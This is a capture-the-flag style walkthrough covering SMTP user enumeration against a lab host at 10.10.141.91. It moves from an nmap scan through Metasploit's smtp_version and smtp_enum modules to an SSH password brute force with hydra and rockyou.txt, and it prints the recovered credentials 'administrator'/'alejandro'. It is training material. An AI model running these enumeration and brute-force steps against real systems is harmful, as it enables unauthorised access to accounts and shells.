# Enumerating SMTP server

For an SMTP server, we can try to find out what usernames are able to log in on the SMTP server. By knowing the usernames this can help us to try to exploit other services like in this example the ssh server.

Do some nmap scan on the computer and check out all the services it's running, but here we are interested into

    nmap -p- -A 10.10.141.91

Which output:

```commandline
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 12:00 CEST
Nmap scan report for 10.10.141.91
Host is up (0.030s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 62:a7:03:13:39:08:5a:07:80:1a:e5:27:ee:9b:22:5d (RSA)
|   256 89:d0:40:92:15:09:39:70:17:6e:c5:de:5b:59:ee:cb (ECDSA)
|_  256 56:7c:d0:c4:95:2b:77:dd:53:d6:e6:73:99:24:f6:86 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
| ssl-cert: Subject: commonName=polosmtp
| Subject Alternative Name: DNS:polosmtp
| Not valid before: 2020-04-22T18:38:06
|_Not valid after:  2030-04-20T18:38:06
|_ssl-date: TLS randomness does not represent time
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/1%OT=22%CT=1%CU=38188%PV=Y%DS=2%DC=T%G=Y%TM=610670D0
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: Host:  polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   30.26 ms 10.8.0.1
2   30.39 ms 10.10.141.91

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.97 seconds
```

Start Metasploit with `msfconsole` and then do a search for the `smtp_version` module.

```
msf6 > search smtp_version

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_version                   normal  No     SMTP Banner Grabber


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_version
```

Use the smtp_version module:

    use auxiliary/scanner/smtp/smtp_version

Look at what options should be set with `show options`, which in turn shows:

```
Module options (auxiliary/scanner/smtp/smtp_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.141.91     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    25               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)
```

Set the required options but use `setg` to set it globally as otherwise we will have to set this variable each time we switch of module, and like we will switch of module a few times:

    setg RHOSTS 10.10.141.91

Run the `smtp_version` exploit to get more information:

```
[+] 10.10.141.91:25       - 10.10.141.91:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.141.91:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

So now we know that the mail name is `polosmtp.home` and that the MTA  (Mail Transfer Agent) is `Postfix`.

Now we are ready to try to enumerate the smtp server to see what username are available. for this we will use the `auxiliary/scanner/smtp/smtp_enum` module. Use `search smtp_enum` and then `use` (select) it like we have done with the previous enumeration.

Now we're going to be using the "top-usernames-shortlist.txt" wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed).

Seclists is an amazing collection of wordlists. If you're running Kali or Parrot you can install seclists with: `sudo apt install seclists` Alternatively, [you can download the repository from here](https://github.com/danielmiessler/SecLists).

Look to what options we should set with `show options`:

```commandline
msf6 auxiliary(scanner/smtp/smtp_enum) > show options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                    Required  Description
   ----       ---------------                                    --------  -----------
   RHOSTS     10.10.141.91                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      25                                                 yes       The target port (TCP)
   THREADS    1                                                  yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                               yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/un  yes       The file that contains a list of probable users accounts.
              ix_users.txt
```

So we know now that we need to adjust the USER_FILE variable to the patch of our `/usr/share/wordlists/SecLists/Usernames` file. This file contains a long list with different user names.

    set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt

Now we can run this exploit with  `run` or `exploit` like you want, it's the same thing (alias). This can take a moment, depending of how many users there are on the system. Here in this case there are not many users at all so it only last for a few seconds to finish. Once the exploit finished you will get a list of usernames:

```
[*] 10.10.141.91:25       - 10.10.141.91:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] 10.10.141.91:25       - 10.10.141.91:25 Users found: administrator
[*] 10.10.141.91:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

From here we are finished with enumerating (finding out usernames on the system). So we can `exit` the Metasploit console. As we saw previously in our `nmap` scan, there's a `ssh` server running on this same computer, so we can now try to bruteforce this ssh server and get in. However, we could have also tried to bruteforce the smtp password with `hydra`. But it's more interesting to bruteforce the `ssh` server as this gives us `shell` access to our victims host. 

To bruteforce the `ssh` server login, we will use `hydra`.

    hydra -t 16 -l  administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.141.91 ssh

After some time we get the answer to our question :-D  I have stripped out irrelevant information:

```commandline
[22][ssh] host: 10.10.141.91   login: administrator   password: alejandro
```

From here on, we can now login to the ssh server with user `administrator` and password `alejandro`.

```commandline
ssh administrator@10.10.141.91
```
